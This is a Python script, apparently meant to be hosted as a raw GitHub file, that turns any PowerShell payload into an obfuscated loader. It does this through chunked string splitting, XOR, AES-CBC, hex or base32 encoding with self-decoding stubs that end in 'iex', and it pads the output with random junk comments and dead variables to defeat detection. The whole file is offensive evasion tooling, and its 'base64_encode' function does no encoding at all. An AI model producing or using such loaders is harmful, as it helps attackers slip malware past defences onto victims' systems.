# encoder.py — Upload this to your GitHub repo (raw link)
import os
import base64
import binascii
import random

junk_comments = [
    "# Debug info",
    "# Temporary variable",
    "# Unused function",
    "# Legacy code",
    "# Performance optimization",
    "# Placeholder",
    "# TODO: remove later",
    "# Backup logic"
]

junk_vars = [
    "$unused = 'junkdata123'",
    "$tempVar = Get-Random",
    "$debugFlag = $false",
    "$logPath = '$env:TEMP\\log.txt'",
    "$counter = 0"
]

def add_junk(code_lines):
    """Insert random junk lines (comments + dead vars)"""
    result = []
    for line in code_lines:
        result.append(line)
        if random.random() < 0.3:  # 30% chance per line
            if random.choice([True, False]):
                result.append(random.choice(junk_comments))
            else:
                result.append(random.choice(junk_vars))
    return "\n".join(result)

def css_obfuscate(payload):
    parts = []
    i = 1
    pos = 0
    while pos < len(payload):
        chunk = payload[pos:pos + random.randint(8, 25)]
        chunk = chunk.replace("'", "`'").replace('$', '`$')
        parts.append(f"$v{i}='{chunk}'")
        i += 1
        pos += len(chunk)
    code = "\n".join(parts) + f"\n iex ({' + '.join(f'$v{j}' for j in range(1, i))})"
    return add_junk(code.splitlines())

def xor_encrypt(payload):
    key = os.urandom(32)
    payload_bytes = payload.encode('utf-16le')
    xor_bytes = bytes(b ^ key[i % len(key)] for i, b in enumerate(payload_bytes))
    xor_b64 = base64.b64encode(xor_bytes).decode()
    key_str = ','.join(str(b) for b in key)
    code = f"""
$key = [byte[]]({key_str})
$data = [Convert]::FromBase64String('{xor_b64}')
for($i=0;$i -lt $data.Length;$i++){{ $data[$i] = $data[$i] -bxor $key[$i % {len(key)}] }}
iex ([Text.Encoding]::Unicode.GetString($data))
"""
    return add_junk(code.strip().splitlines())

def aes_encrypt(payload):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = os.urandom(32)
        iv = os.urandom(16)
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        pad = 16 - (len(payload.encode('utf-16le')) % 16)
        padded = payload.encode('utf-16le') + bytes([pad] * pad)
        encrypted = encryptor.update(padded) + encryptor.finalize()
        enc_b64 = base64.b64encode(encrypted).decode()
        key_str = ','.join(str(b) for b in key)
        iv_str = ','.join(str(b) for b in iv)
        code = f"""
$key = [byte[]]({key_str})
$iv = [byte[]]({iv_str})
$enc = [Convert]::FromBase64String('{enc_b64}')
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$dec = $aes.CreateDecryptor().TransformFinalBlock($enc,0,$enc.Length)
iex ([Text.Encoding]::Unicode.GetString($dec).TrimEnd("`0"))
"""
        return add_junk(code.strip().splitlines())
    except:
        return payload

def base64_encode(payload):
    return add_junk(payload.splitlines())

def hex_encode(payload):
    hex_data = binascii.hexlify(payload.encode('utf-16le')).decode()
    code = f"""
$h = '{hex_data}'
$b = for($i=0;$i -lt $h.Length;$i+=2){{ [Convert]::ToByte($h.Substring($i,2),16) }}
iex ([Text.Encoding]::Unicode.GetString($b))
"""
    return add_junk(code.strip().splitlines())

def base32_encode(payload):
    b32_data = base64.b32encode(payload.encode('utf-16le')).decode()
    code = f"""
$b32 = '{b32_data}'
$map = @{{'A'=0;'B'=1;'C'=2;'D'=3;'E'=4;'F'=5;'G'=6;'H'=7;'I'=8;'J'=9;'K'=10;'L'=11;'M'=12;'N'=13;'O'=14;'P'=15;'Q'=16;'R'=17;'S'=18;'T'=19;'U'=20;'V'=21;'W'=22;'X'=23;'Y'=24;'Z'=25;'2'=26;'3'=27;'4'=28;'5'=29;'6'=30;'7'=31}}
$bytes = [byte[]]::new([math]::Ceiling($b32.Length*5/8))
$bi=0;$buf=0;$bl=0
foreach($c in $b32.ToUpper().ToCharArray()){{
    if($map.ContainsKey($c)){{$v=$map[$c];$buf=($buf-shl5)-bor$v;$bl+=5
    while($bl-ge8){{$bl-=8;$bytes[$bi]=($buf-shr$bl)-band0xFF;$bi++}}}}
}}
iex ([Text.Encoding]::Unicode.GetString($bytes))
"""
    return add_junk(code.strip().splitlines())
